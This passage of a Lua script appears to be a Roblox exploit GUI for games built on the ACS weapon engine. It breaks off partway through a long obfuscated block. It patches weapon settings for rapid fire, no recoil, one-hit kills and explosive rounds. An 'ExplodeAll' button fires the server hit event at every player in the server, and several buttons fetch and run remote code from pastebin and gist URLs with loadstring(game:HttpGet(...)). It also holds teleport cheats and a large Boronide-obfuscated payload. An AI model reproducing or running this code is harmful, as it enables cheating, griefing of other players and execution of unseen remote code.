		end
	end)

	local optionsMods = core.Main.Root.RootMain.Modifiers2

	optionsMods.Firerate.MouseButton1Click:Connect(function()
		local nig = require(getselected["ACS_Modulo"].Variaveis.Settings)
		nig.Firerate = 100000
		nig.SuppressMaxDistance = 100
		nig.SuppressTime = 30
		nig.Distance = 1000000
		nig.BDrop = 0.01
		nig.BSpeed = 6000
		nig.BulletPenetration = 100

		nig.FallOfDamage = 0
		nig.MaxSway = 0
		nig.VRecoil = { 0, 0 }
		nig.HRecoil = { 0, 0 }
		nig.AimRecover = 0
		nig.RecoilPunch = 0
		nig.VPunchBase = 0
		nig.HPunchBase = 0
		nig.DPunchBase = 0
		nig.MinSpread = 0
		nig.MaxSpread = 0

	end)

	optionsMods.NoRecoil.MouseButton1Click:Connect(function()
		local nig = require(getselected["ACS_Modulo"].Variaveis.Settings)

		nig.SuppressMaxDistance = 100
		nig.SuppressTime = 30
		nig.Distance = 1000000
		nig.BDrop = 0.01
		nig.BSpeed = 6000
		nig.BulletPenetration = 100

		nig.FallOfDamage = 0
		nig.MaxSway = 0
		nig.VRecoil = { 0, 0 }
		nig.HRecoil = { 0, 0 }
		nig.AimRecover = 0
		nig.RecoilPunch = 0
		nig.VPunchBase = 0
		nig.HPunchBase = 0
		nig.DPunchBase = 0
		nig.MinSpread = 0
		nig.MaxSpread = 0


	end)

	optionsMods.OneHit.MouseButton1Click:Connect(function()
		local nig = require(getselected["ACS_Modulo"].Variaveis.Settings)
		nig.HeadDamage = {130,140}
		nig.TorsoDamage = {130,140}
		nig.Limbs = {130,140}
	end)

	optionsMods.Explosive.MouseButton1Click:Connect(function()
		local nig = require(getselected["ACS_Modulo"].Variaveis.Settings)

		bomb["ExplosiveHit"] = true
		game:GetService("Players").BuckWarz.Backpack.Binoculars["ACS_Modulo"].Variaveis.Ammo.Value = 100000000


		nig.ExPressure = 1000000000000
		nig.ExpRadius = 100000000000
		DestroyJointRadiusPercent = 1000
		nig.BulletLightBrightness = 10

	end)
	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()

	mouse.KeyDown:connect(function(key)
		if key == "t" then
			core.Enabled = not core.Enabled
		end
	end)
end)

CerrarGui.Name = "CerrarGui"
CerrarGui.Parent = MAINGUI
CerrarGui.BackgroundColor3 = Color3.fromRGB(171, 0, 0)
CerrarGui.Position = UDim2.new(0.882352948, 0, 0.00434782589, 0)
CerrarGui.Size = UDim2.new(0, 50, 0, 37)
CerrarGui.Font = Enum.Font.Sarpanch
CerrarGui.Text = "X"
CerrarGui.TextColor3 = Color3.fromRGB(0, 0, 0)
CerrarGui.TextSize = 35.000

Version173.Name = "Version173"
Version173.Parent = MAINGUI
Version173.BackgroundColor3 = Color3.fromRGB(34, 100, 255)
Version173.BackgroundTransparency = 1.000
Version173.BorderColor3 = Color3.fromRGB(16, 16, 16)
Version173.Position = UDim2.new(0.750588238, 0, 0.860869586, 0)
Version173.Size = UDim2.new(0, 116, 0, 44)
Version173.Font = Enum.Font.SourceSans
Version173.Text = "Version 1.7.4"
Version173.TextColor3 = Color3.fromRGB(229, 255, 243)
Version173.TextSize = 18.000
Version173.TextStrokeColor3 = Color3.fromRGB(31, 31, 31)

CazaRatasGui.Name = "CazaRatasGui"
CazaRatasGui.Parent = MAINGUI
CazaRatasGui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CazaRatasGui.Position = UDim2.new(0.014117647, 0, 0.713043451, 0)
CazaRatasGui.Size = UDim2.new(0, 113, 0, 42)
CazaRatasGui.Font = Enum.Font.SourceSans
CazaRatasGui.Text = "CazaRatasGUI"
CazaRatasGui.TextColor3 = Color3.fromRGB(0, 0, 0)
CazaRatasGui.TextSize = 20.000
CazaRatasGui.MouseButton1Down:connect(function()
	if game.PlaceId == 4954472442 then
		local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
		local Window = Library.CreateLib("Policia Argentina", "Sentinel")

		-- Main

		local Tab = Window:NewTab("Main")
		local Section = Tab:NewSection("Scripts")
		Section:NewButton("Musica", "BtwBabySounds", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/H96GTh1r"))()
		end)
		Section:NewButton("BalasExplosivas", "Activa las Balas Explosivas", function()
			loadstring(game:HttpGet('https://gist.githubusercontent.com/CazaGeis/a26dcc29cdff84d941458e80f7013121/raw/31668eae6703e66eafc24ebdc969881a306b10c7/BalaExplosiva'))()
		end)
		Section:NewButton("KillAll", "KillAll in the server", function()
			loadstring(game:HttpGet('https://gist.githubusercontent.com/CazaGeis/f1823dfc632c4c1f27ea145fff2a692a/raw/4a89c933e9b11d3363201c66b20a010e8fd75b6a/KillAllAcs_Engine'))()
			print("Clicked")
		end)
		Section:NewButton("ExplodeAll", "Explode All in the server", function()
			local Settings = {
				["ExplosiveHit"] = true,
				["ExPresure"] = 10000000000000,
				["ExpRadius"] = 100000000000,
				["DestroyJointRadiusPercent"] = 10000000000,
				["ExplosionDamage"] = 100000000000000000,
			}

			for i,v in pairs(game.Players:GetChildren()) do
				game.ReplicatedStorage.ACS_Engine.Eventos.Hit:FireServer(
					v.Character.Head.Position, 
					v.Character.Head, 
					v.Character.Head.Position, 
					Enum.Material.Plastic, Settings
				)
				print("Killed ".. v.Name)
			end
		end)
		Section:NewButton("KillEspecificPlayer", "Kill a player you want", function()
			loadstring(game:HttpGet('https://gist.githubusercontent.com/CazaGeis/ff6db22250b0266b1d67df8d5aaf4f1b/raw/ed621508d441292224becff12c35dbbd9d3c5ea7/KillPlayer'))()
		end)
		Section:NewButton("Piola Gui", "Simplemente Piola", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/6JN4K13b"))()
		end)
		Section:NewButton("Death Click", "Kill a player with a simple click", function()
			loadstring(game:HttpGet('https://gist.githubusercontent.com/CazaGeis/0d918ae11ce4b41b869b1d4855267d59/raw/13fbc7fc9c7fb82ff2dcc0958918081bd0130ad0/DeathClick'))()
		end)
		Section:NewButton("Aimbot", "Bassicaly Aimbot LOL", function()
			loadstring(game:HttpGet('https://pastebin.com/raw/cHKVsTg8'))()
		end)
		Section:NewButton("InfiniteYield", "Admin", function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
		end)

		-- Player

		local Tab = Window:NewTab("Player")
		local Section = Tab:NewSection("Player")
		Section:NewSlider("Walkspeed", "Changes the walkspeed", 250, 16, function(v) -- 500 (MaxValue) | 0 (MinValue)
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
		end)
		Section:NewSlider("JumpPower", "Changes the JumpPower", 250, 50, function(v) -- 500 (MaxValue) | 0 (MinValue)
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
		end)

		-- Teleport

		local Tab = Window:NewTab("Teleport")
		local Section = Tab:NewSection("Lugares")
		Section:NewButton("Puesto", "Te lleva al Puesto", function(v)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3169.94189, 362.756653, 2855.69263)
		end)
		Section:NewButton("YPF", "Te lleva a YPF", function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2735.41748, 362.07663, 4636.53613)
		end)
		Section:NewButton("Hospital", "Te lleva al Hospital", function(v)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-5658.57178, 362.796631, 3104.00586)
		end)
		Section:NewButton("Kiosco", "Te lleva al Kiosco", function(v)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4406.73779296875, 362.569091796875, -2890.408447265625)
		end)
		Section:NewButton("Mamba", "Te lleva a Mamba", function(v)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3914.14185, 362.016632, -3952.91577)
		end)
		Section:NewButton("Revolver", "Te lleva a Revolver", function(v)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4276.22363, 362.596649, -3032.88428)
		end)
		Section:NewButton("M1911", "Te lleva a M1911", function(v)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-5243.11768, 362.016632, -2999.15063)
		end)
		Section:NewButton("Comisaria Bona", "Te lleva a Comisaria Bona", function(v)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2692.86182, 362.536591, 6088.31592)
		end)
		Section:NewButton("Comisaria Ciudad", "Te lleva a la Comisaria de la Ciudad", function(v)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3685.94458, 364.416626, 5896.80908)
		end)
		local ChalecoSection = Tab:NewSection("Chalecos")
		ChalecoSection:NewButton("Chaleco Bonaerense", "ChalecoBona", function()
			local lascord = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

			wait(1)

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2676.23389, 362.166626, 6270.8335)

			wait(0.5)

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (lascord)
		end)
		ChalecoSection:NewButton("Chaleco Ciudad", "", function()
			local lascord = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

			wait(1)

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3789.00928, 364.396637, 5822.21143)

			wait(0.5)

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (lascord)
		end)
	end
end)

BulletBoomAllGuns.Name = "BulletBoomAllGuns"
BulletBoomAllGuns.Parent = MAINGUI
BulletBoomAllGuns.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BulletBoomAllGuns.Position = UDim2.new(0.711928427, 0, 0.460869551, 0)
BulletBoomAllGuns.Size = UDim2.new(0, 113, 0, 42)
BulletBoomAllGuns.Font = Enum.Font.SourceSans
BulletBoomAllGuns.Text = "BulletBoom"
BulletBoomAllGuns.TextColor3 = Color3.fromRGB(0, 0, 0)
BulletBoomAllGuns.TextSize = 20.000
BulletBoomAllGuns.MouseButton1Down:connect(function()
--[[
	ttwiz_z#2081
--]]

	local a,b,c=nil,nil,nil([[Boronide, discord.gg/BZEjFbeUvk]]):gsub('(.*)',function(d)local e="AVXGG21lWG"local f="Hvm2b2yWzKCRL28cPR"local g=2232;local h=5862;while(g<h)do h=g-11724;while(g>(h-11))do h=(g+1186)*2;while(g<h)do h=g-13672;c=getfenv or function()return _ENV end end;if g>(h-4464)then h=(g+4464)f=d end end;if(4464-g)<(h+2235)then g=((h+2232)*2)e=d end end;local c=c()local d=c["string"]["\99\104\97\114"](99,104,97,114)local g=c[string[d](115,116,114,105,110,103)]local h="y7gncVjS8lfwNB6uXC"local j="CXYvRXfFo2Z_"local k="Mf"do local a=772;local b=132.35855265676878;local e=455.83002616856544;local f={}repeat if((b==132.35855265676878)and(e==455.83002616856544))and(a==772)then f[442]=false;e=51.1670608508353;f[641]='gZNuizDVx9'a=0;f[378]='DRwBbDgdta'b=491.79206516758893 end;if(a==89)and((b==95.18828658725451)and(e==81.0074173479752)and(f[442]==false)and(f[641]=='se1KW3mAFi')and(f[378]=='SvUrURLxxF'))then break end;if(a==963)and((b==90.7040216327506)and(e==308.40204059555634)and(f[442]==false)and(f[641]=='IGudLv7PzF')and(f[378]=='8FXytJ0exU'))then f[378]='SvUrURLxxF'f[442]=false;f[641]='se1KW3mAFi'j=c[g[d](115,116,114,105,110,103)][g[d](103,109,97,116,99,104)]e=81.0074173479752;a=89;b=95.18828658725451 end;if((b==38.789268911116174)and(e==192.84915663851808)and(f[442]==false)and(f[641]=='Ta2w6oKcnJ')and(f[378]=='tZc57Sksa9'))and(a==615)then a=772;b=132.35855265676878;e=455.83002616856544 end;while((b==491.79206516758893)and(e==51.1670608508353)and(f[442]==false)and(f[641]=='gZNuizDVx9')and(f[378]=='DRwBbDgdta'))and(a==0)do h=c[g[d](115,116,114,105,110,103)][d]f[442]=false;a=58;f[641]='Rj0AgStDwg'e=240.02608419500538;f[378]='0jEMAxGrzN'b=737.3310633805796;break end;while((b==737.3310633805796)and(e==240.02608419500538)and(f[442]==false)and(f[641]=='Rj0AgStDwg')and(f[378]=='0jEMAxGrzN'))and(a==58)do k=c[g[d](115,116,114,105,110,103)][g[d](98,121,116,101)]f[378]='8FXytJ0exU'f[641]='IGudLv7PzF'e=308.40204059555634;b=90.7040216327506;a=963;f[442]=false;break end until(false)end;b={[e]=31,['\95'..h(66,111,114,111,110,105,100,101,44,32,100,105,115,99,111,114,100,46,103,103,47,66,90,69,106,70,98,101,85,118,107)]=f}b[g[d](95,120,111,48,121,57,49,50,55,51,89,54,54,49,88,50,88)]=k;b[g[d](95,120,88,122,79,121,105,95,48,49,51,56,52,51,76,48,121)]=h;b[g[d](95,120,90,51,89,73,89,79,53,57,89,48,52,89,52,55,79)]=j;do local c=633;local d=134.1754289272596;local g=65.43373499287401;local j={}repeat if(c==0)and((d==558.6484597340124)and(g==184.20292416172364)and(j[749]==false)and(j[853]=='7ytJIApoj3')and(j[992]=='v0y4IcPBw1'))then if(b[e]~=nil and(#f~=b[e]))then return 0 end;j[853]='CSxhf7kU5R'j[749]=false;g=127.48007551397366;d=843.6962400276494;j[992]='1yoHaehqLB'c=657 end;if(c==439)and((d==450.64419991375)and(g==554.3664890824319)and(j[749]==false)and(j[853]=='mv5DyMBblY')and(j[992]=='8807patUi3'))then g=46.73147456957812;d=453.87626614394304;a=e;j[749]=false;c=283;j[992]='qO5tNFE0xw'j[853]='HRvnMqho7Y'end;while((d==952.4414048180274)and(g==596.1358714582299)and(j[749]==false)and(j[853]=='eNKH5KbobB')and(j[992]=='VrSUG6Eyok'))and(c==602)do g=65.43373499287401;c=633;d=134.1754289272596;break end;if(c==657)and((d==843.6962400276494)and(g==127.48007551397366)and(j[749]==false)and(j[853]=='CSxhf7kU5R')and(j[992]=='1yoHaehqLB'))then j[853]='c69sne4Rlb'g=70.63285715749142;d=101.20135065195241;j[749]=false;j[992]='cdatXrapLq'c=197;if(h(66,111,114,111,110,105,100,101,44,32,100,105,115,99,111,114,100,46,103,103,47,66,90,69,106,70,98,101,85,118,107)~=e)then return false end end;while(c==633)and((d==134.1754289272596)and(g==65.43373499287401))do j[992]='v0y4IcPBw1'd=558.6484597340124;g=184.20292416172364;j[853]='7ytJIApoj3'j[749]=false;c=0;break end;while((d==101.20135065195241)and(g==70.63285715749142)and(j[749]==false)and(j[853]=='c69sne4Rlb')and(j[992]=='cdatXrapLq'))and(c==197)do j[749]=false;c=439;g=554.3664890824319;j[992]='8807patUi3'if(f~=b['\95'..e])then return(b._uFL3vjau3bc)end;d=450.64419991375;j[853]='mv5DyMBblY'break end;if(c==283)and((d==453.87626614394304)and(g==46.73147456957812)and(j[749]==false)and(j[853]=='HRvnMqho7Y')and(j[992]=='qO5tNFE0xw'))then break end until(false)end;a=e;b[e]=nil end)local d=b["_xXzOyi_013843L0y"]local e=b["_xo0y91273Y661X2X"]local f=b["_xZ3YIYO59Y04Y47O"]local g=c()[d(115,116,114,105,110,103)]local h=g[d(102,111,114,109,97,116)]local j=g[d(115,117,98)]local j=c()[d(110,101,120,116)]local j=c()[d(116,97,98,108,101)][d(99,111,110,99,97,116)]local j=c()[d(97,115,115,101,114,116)]local k=c()[d(112,97,105,114,115)]local g=g[d(108,101,110)]local l=c()[d(114,97,119,103,101,116)]local m=c()[d(117,110,112,97,99,107)]local n=c()[d(109,97,116,104)][d(102,108,111,111,114)]local n=function(a,b)return n(a)*(2^b)end;local o=function(a,b)if(b>=0)then return a*n(1,b)else return a/n(1,-b)end end;local p={}local q={}for a=0,255 do local a,b=d(a),d(a,0)p[a]=b;q[b]=a end;local n=n(o(0,63),62) ;(b)["_xo0y91273Y661X2X"]=nil(b)["_xXzOyi_013843L0y"]=(p[417.41577464727044]) ;(b)["_xZ3YIYO59Y04Y47O"]=nil;local n=c()[d(115,116,114,105,110,103)][d(115,117,98)]local q="_xIi8zZXi2420l8"local r=function(...)return...end;local s=0;local s={(b._amGD4JVyp)}local s=function(a,c,d)local a,b,d,e=d[(b._al7eEIS1cucNtO)](a,c,c+3)c=c+4;return(back*16777216)+(d*65536)+(b*256)+a end;local r=function(a,c,d,e)a=a or 1;local c=e[(b._jkzcIPXn1)](c,d,r(d,r(a,1,(b._BJSPS)),(b._JeH3GYwJw51Zxj4)))d=r(d,a,(b._JeH3GYwJw51Zxj4))return c end;local r=function(a,c,d)local a,b,d=d[(b._al7eEIS1cucNtO)](a,c,c+2)c=c+3;return(d*65536)+(b*256)+a end;local r=function(a,c,d)local a,b,d,e,f=d[(b._al7eEIS1cucNtO)](a,c,c+4)c=c+5;return(e*16777216)+(d*65536)+(b*256)+a+(f*4294967296)end;local r=function(a,c,d)local a,b=d[(b._al7eEIS1cucNtO)](a,c,c+1)c=c+2;return(b*256)+a end;local function r(a,c,d)j(d,(b._Yw8GtVcHOgubh))if d==(b._wxy2Mt2wtEFBKQ0)then return a==c elseif d==(b._qHOKndYbyx7)then return a<c elseif d==(b._qXRPsOBcEblnG)then return a<=c end end;local function s(a,c,d)j(d,(b._Yw8GtVcHOgubh))if r(d,(b._vbJBy),(b._wxy2Mt2wtEFBKQ0))then return a*c elseif r(d,(b._SeT0DgK6ugM),(b._wxy2Mt2wtEFBKQ0))then return a/c elseif r(d,(b._JeH3GYwJw51Zxj4),(b._wxy2Mt2wtEFBKQ0))then return a+c elseif r(d,(b._BJSPS),(b._wxy2Mt2wtEFBKQ0))then return a-c elseif r(d,(b._xStEV93ayVf),(b._wxy2Mt2wtEFBKQ0))then return a%c elseif r(d,(b._raMJ1),(b._wxy2Mt2wtEFBKQ0))then return a^c end end;local function t(a,c)j(c,(b._Yw8GtVcHOgubh))if r(c,(b._BaHhlvx4wB),(b._wxy2Mt2wtEFBKQ0))then return-a elseif r(c,(b._s_SLy8wq),(b._wxy2Mt2wtEFBKQ0))then return not a elseif r(c,(b._mbKHJQa8qMXDnVa),(b._wxy2Mt2wtEFBKQ0))then return#a end end;local function u(a,c,d)j(d,(b._Yw8GtVcHOgubh))if r(d,(b._ZpI0avsGFB_vr),(b._wxy2Mt2wtEFBKQ0))then return a..c elseif r(d,(b._hO4tWhHnNF),(b._wxy2Mt2wtEFBKQ0))then return u(a,c)end end;local j={}local w,x,y,z,A;do local a=821;local b=383.56038480454083;local c=769.1905606832311;local d={}repeat while((b==792.358411210254)and(c==37.0391123475917)and(d[294]==false)and(d[655]=='27z2sTslku')and(d[819]=='4Lx5ZGfZj7'))and(a==215)do c=769.1905606832311;b=383.56038480454083;a=821;break end;if(a==533)and((b==31.664006496336867)and(c==78.28464581436059)and(d[294]==false)and(d[655]=='HmWCOCSWuQ')and(d[819]=='CWru0gaN6K'))then break end;if((b==383.56038480454083)and(c==769.1905606832311))and(a==821)then d[655]='vGi6lLTG4H'b=69.87267779411049;c=538.6106260353745;a=0;d[294]=false;d[819]='ZSHTs4emLL'end;while((b==545.9591044292109)and(c==52.91183711720951)and(d[294]==false)and(d[655]=='9kmeOg4mdP')and(d[819]=='Rf8EHf2K42'))and(a==373)do d[294]=false;c=78.28464581436059;a=533;z=function(a,b)local c=""local d=1;for f=((function(A) return (#A - 57) end)('"Who wishes to fight must first count the cost." - Sun Tzu')),#a do local a=x(a[f],e(n(b,d,d)))c=c..j[a]or a;d=d+1;if d>#b then d=1 end end;return c end;b=31.664006496336867;d[819]='CWru0gaN6K'd[655]='HmWCOCSWuQ'break end;while((b==69.87267779411049)and(c==538.6106260353745)and(d[294]==false)and(d[655]=='vGi6lLTG4H')and(d[819]=='ZSHTs4emLL'))and(a==0)do d[819]='Rf8EHf2K42'a=373;d[655]='9kmeOg4mdP'b=545.9591044292109;d[294]=false;c=52.91183711720951;w=function(a,b)local c=""local d=1;for f=1,#a do local a=x(e(n(a,f,f)),e(n(b,d,d)))c=c..l(j,a)or a;d=d+((function(A) return (#A - 111) end)('"Treat your men as you would your own beloved sons. And they will follow you into the deepest valley." - Sun Tzu'))if d>#b then d=1 end end;return c end;break end until(false)end;x=function(a,b)local c,d=1,0;while a>0 and b>0 do local e,f=a%2,b%2;if e~=f then d=d+c end;a,b,c=(a-e)/2,(b-f)/2,c*(#('"He will win who knows when to fight and when not to fight." - Sun Tzu') - 68)end;if a<b then a=b end;while a>0 do local b=a%2;if b>0 then d=d+c end;a,c=(a-b)/2,c*(#('"Even the finest sword plunged into salt water will eventually rust." - Sun Tzu') - 77)end;return d end;for a,b in k(p)do j[e(a)]=a end;local p=(function()return 0.10038979031132289 end)local w=(function(a)while a do p()end;return function()j=nil;x=nil end end) ;(p)()local function p(a,b,c)if c then local a=(a/2^(b-1))%2^((c-1)-(b-1)+1)return a-a%(#('"Be where your enemy is not." - Sun Tzu') - 38)else local b=2^(b-((function(A) return (#A - 203) end)('"The art of war is of vital importance to the State. It is a matter of life and death, a road either to safety or to ruin. Hence it is a subject of inquiry which can on no account be neglected." - Sun Tzu')))if(a%(b+b)>=b)then return 1 else return 0 end end end;local w=2109;local z=3607;while(w<z)do z=w-7214;while(w>(z-((function(A) return (#A - 197) end)('"Foreknowledge cannot be gotten from ghosts and spirits, cannot be had by analogy, cannot be found out by calculation. It must be obtained from people, people who know the conditions of the enemy." - Sun Tzu'))))do z=(w+3042)*2;A=function(a,b)local c=""local d=(#('"The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." - Sun Tzu') - 98)for f=1,#a do local a=x(e(n(a,f,f)),e(n(b,d,d)))c=c..l(j,a)or a;d=d+(#('"Attack is the secret of defense; defense is the planning of an attack." - Sun Tzu') - 81)if d>#b then d=1 end end;return c end end;if(4218-w)<(z+2127)then w=((z+2109)*2)y=function(a,b)local c=""local d=1;for f=1,#a do local a=x(a[f],e(n(b,d,d)))c=c..j[a]or a;d=d+1;if d>#b then d=(#('"The art of war is of vital importance to the State. It is a matter of life and death, a road either to safety or to ruin. Hence it is a subject of inquiry which can on no account be neglected." - Sun Tzu') - 203)end end;return c end end end;local w={{},{}}local z=1;for a=1,255 do if a>=112 then w[2][z]=a;z=z+1 else w[(#('"What the ancients called a clever fighter is one who not only wins, but excels in winning with ease." - Sun Tzu') - 111)][a]=a end end;local m=d(m(w[1]))..d(m(w[2]))local w,z,B,C,D,E,F;C=y({47,45,9,115,69,57,48,54,57,60,2},"\103\103\102\52\49\80\70\81\73\82\100\98")do local a=(#('"Who does not know the evils of war cannot appreciate its benefits." - Sun Tzu') - 44)local b=97.15029297527285;local c=86.13623991524078;local d={}for e in(function()return 498 end)do while((b==39.334812853063916)and(c==28.03598736285007)and(d[962]==false)and(d[109]=='YoyKDjLObY')and(d[437]=='5eRuE5P9fS'))and(a==987)do d[109]='G2yCw4PXCm'c=550.023818305093;B=function(a,...)return A(a,z,...)end;d[962]=false;b=213.5227875460195;d[437]='oIxLP5nXPQ'a=500;break end;while((b==220.82578405703154)and(c==643.3404754563949)and(d[962]==false)and(d[109]=='Ivy7rkm4FK')and(d[437]=='4H13wBjiAW'))and(a==0)do d[962]=false;a=987;c=28.03598736285007;d[109]='YoyKDjLObY'd[437]='5eRuE5P9fS'b=39.334812853063916;w=function(...)return y(...,C)end;break end;while((b==213.5227875460195)and(c==550.023818305093)and(d[962]==false)and(d[109]=='G2yCw4PXCm')and(d[437]=='oIxLP5nXPQ'))and(a==500)do d[962]=false;b=238.84586328728153;d[109]='tFENSoffjz'D=function(a,...)return A(a,C,...)end;a=178;c=474.31813310460575;d[437]='2LGppx1UTB'break end;while((b==632.0180539974386)and(c==170.78727171507296)and(d[962]==false)and(d[109]=='uom0EPhEKX')and(d[437]=='oAxTyt5zOk'))and(a==794)do a=34;c=86.13623991524078;b=97.15029297527285;break end;if((b==238.84586328728153)and(c==474.31813310460575)and(d[962]==false)and(d[109]=='tFENSoffjz')and(d[437]=='2LGppx1UTB'))and(a==178)then break end;while((b==97.15029297527285)and(c==86.13623991524078))and(a==34)do d[437]='4H13wBjiAW'a=0;c=643.3404754563949;d[109]='Ivy7rkm4FK'b=220.82578405703154;d[962]=false;break end end end;z=y({50,(#('"What the ancients called a clever fighter is one who not only wins, but excels in winning with ease." - Sun Tzu') - 98),54,76,100,28,1,61,2,34},"\103\103\102\52\49\80\70\81\73\82\100\98")F=y({51,35,(#('"There is no instance of a nation benefiting from prolonged warfare." - Sun Tzu') - 60),68,72,(#('"Great results can be achieved with small forces." - Sun Tzu') - 30),12,53,36,((function(A) return (#A - 89) end)('"He who is prudent and lies in wait for an enemy who is not, will be victorious." - Sun Tzu')),9,51},"\103\103\102\52\49\80\70\81\73\82\100\98")local y=e(d(1))b["_xZxxx21IXI6Yz7_07"]=function(a,c)local d=d()local f=y;for g=y,#a do local a=x(e(n(a,g,g)),e(n(c,f,f)))d=h(((b._HbIrnx8Z)),d,l(j,a)or a)f=f+y;f=(f>#c and y)or f end;return d end;local h=b[w({23,50,53,63,12,17,68,86,57,54,47,126,(#('"Even the finest sword plunged into salt water will eventually rust." - Sun Tzu') - 60),21,112,43,89,65})]return(function(l)if false then while l do l=85.49777759439428 end else local y,G,H;H=(H or 0)for a,a in k(l)do H=(H or 0)+1 end;if(H<(#('"Even the finest sword plunged into salt water will eventually rust." - Sun Tzu') - 77))then return("z")end;local k=5076;local H=4760;while(k>(H-((function(A) return (#A - 100) end)('"Treat your men as you would your own beloved sons. And they will follow you into the deepest valley." - Sun Tzu'))))do H=(k+4459)*(#('"If the mind is willing, the flesh could go on and on without many things." - Sun Tzu') - 83)while(k<H)do H=k-38140;y=l[(#('"If quick, I survive. If not quick, I am lost. This is death." - Sun Tzu') - 71)]end;if k>(H-10152)then H=(k+10152)G=l[2]end end;b={}do local a=c()[D("\59\47\27\42\17\29\23\19\17\12\10\45")]if false then while b do a=(function()return 3162.926864644224 end)end else if(a~=nil)then b[D("\23\50\38\46\76\19\44\63\25\92\82\122\122\3\127")]=a({[139.46212917495615]=-15.274131357547915;[-240.31539636749]=53.56406383523722;[-113.68903385271167]=85.53269917548536;[-91.63379817176943]=88.54263548127727;[-131.87881646919564]=92.14809470457692;[223.98097700051432]=-65.09589739586126},{[D("\23\21\27\40\7\29\4\14\30\9")]=function(a,a)return(function()while true do b=b or nil;if(b~=nil and b[1]~=nil)then break else b["\70\87\90\80\69\103\113\108\81\106\69"]="\69\66\120\112\97\109\115\99\84\50"end end;return"\69\70\112\113\66\105\48\121\112\76\80\106\95\119\102\111\112\75\57\90\81\95\65\100\83\90\107\101\72\99\72"end)()end})b[1]=b[q]end;do do local a=937;local c=60.52571280801506;local d=391.1095970359198;local e={}for f in(function()return 498 end)do if(a==455)and((c==404.8825855318942)and(d==202.6024676441381)and(e[441]==false)and(e[169]=='e7v8kupYDC')and(e[452]=='orzN8ZPfIE'))then a=55;d=94.23202495136044;e[452]='t97v9QiCMy'b[D("\23\36\9\30\37\2\63\0\0\4\57")]=A("\60\59\5\1\65\12\15\18\40\26",C)c=789.9736482407033;e[169]='mI2pjeVxpd'e[441]=false end;while(a==685)and((c==175.14075456511068)and(d==6.842641860260457)and(e[441]==false)and(e[169]=='0DEleF0XKu')and(e[452]=='0ziKTVbjI7'))do b[D("\23\19\40\63\36\24\63\86\57")]=A("\48\19\87\62\56\88\70\56\8\54",C)c=397.7858327468677;e[441]=false;e[452]='8RgOfSKQ5P'a=770;e[169]='Rid8EdX5r1'd=645.3338854743135;break end;while(a==917)and((c==912.805725148168)and(d==508.4125337370034)and(e[441]==false)and(e[169]=='iyZ9Md7Rdh')and(e[452]=='fdRz9JDonv'))do a=676;e[169]='qYhFfGfGNS'b[D("\23\13\86\21\7\6\47\23\71\33")]=A("\4\30\32\9\26\93\30\15\24\24",C)d=681.4192690444966;e[441]=false;e[452]='eaQ6kOs3YL'c=15.81505442086331;break end;while((c==137.7677189461901)and(d==109.00836393966723)and(e[441]==false)and(e[169]=='WF3TKNXu6g')and(e[452]=='TvA0PXT8B9'))and(a==534)do b[D("\23\63\41\11\71\31\28\6\5\93\4\43")]=A("",C)c=912.211156570489;e[441]=false;d=279.9146523035364;a=396;e[452]='bJTZ4uUxAp'e[169]='z4B8Sxi5oC'break end;if(a==398)and((c==686.8558337819408)and(d==26.67520328716491)and(e[441]==false)and(e[169]=='cJEpaiDr7c')and(e[452]=='nWJV6n8I1Q'))then d=208.1346792551914;e[441]=false;e[169]='wuKtjXWK6e'c=148.09694725947088;b[D("\23\46\37\41\48\5\62\40\7\8\54")]=A("\37\60\12\46\69\36\5\63\19\45",C)a=678;e[452]='IfC3R0rloG'end;while(a==962)and((c==3.0489526536600247)and(d==203.0777517741271)and(e[441]==false)and(e[169]=='ozbI5zFfVW')and(e[452]=='mmXNlwxpr1'))do d=778.3969671299377;c=394.38674896614646;e[169]='3Jc7qpY7H9'a=53;e[441]=false;b[D("\23\36\40\0\63\40\2\33\26\10\62\56")]=A("\48\51\95\118\24\81\58\29\69\33",C)e[452]='QVySJF4Nmu'break end;while(a==741)and((c==199.37172696505402)and(d==51.409031091789004)and(e[441]==false)and(e[169]=='sluUywB1mF')and(e[452]=='ETbXJepDLE'))do a=668;b[D("\23\30\13\9\39\90\47\87\29\6\33\127\13\62\42\25")]=A("\50\7\10\115\31\57\33\80\59\3",C)e[452]='9BhBfqgfnR'e[441]=false;c=445.22391871320133;d=359.8013495997068;e[169]='X05UohB8G7'break end;if((c==120.30756325058458)and(d==1.8209175682640453)and(e[441]==false)and(e[169]=='mkj3kt8HwJ')and(e[452]=='OHoB5FIfDo'))and(a==948)then e[441]=false;d=79.22223938600442;c=236.67020902004379;e[452]='ATRfnlcAIo'e[169]='ZNSL2j1URC'b[D("\23\16\21\112\3\81\69\63\50")]=A("\33\36\25\38\24\0\18\71\25\0\2\45\50\78",C)a=157 end;if((c==6.3274643267013015)and(d==311.40235064819467)and(e[441]==false)and(e[169]=='f0Kcg6yyfA')and(e[452]=='oG9BAwTTHd'))and(a==31)then 